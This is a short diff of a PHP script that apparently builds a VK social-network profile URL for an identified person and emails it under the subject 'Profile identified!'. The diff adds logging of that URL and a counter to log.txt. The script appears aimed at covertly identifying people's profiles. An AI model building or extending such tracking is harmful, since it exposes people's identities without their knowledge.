@@ -18,6 +18,9 @@ $myss = 'http://vk.com/id'.$mycc;
 
 //print $myss; 
 
+$myfile = fopen("log.txt", "w") or die("Unable to open file!");
+fwrite($myfile, $myss."\n");
+
 
 $to=$mymail;
     $subject='Идентифицирован профиль!';
@@ -30,4 +33,6 @@ $to=$mymail;
      else    
         $i=1;
 
+fwrite($myfile, $i."\n");
 
+fclose($myfile);
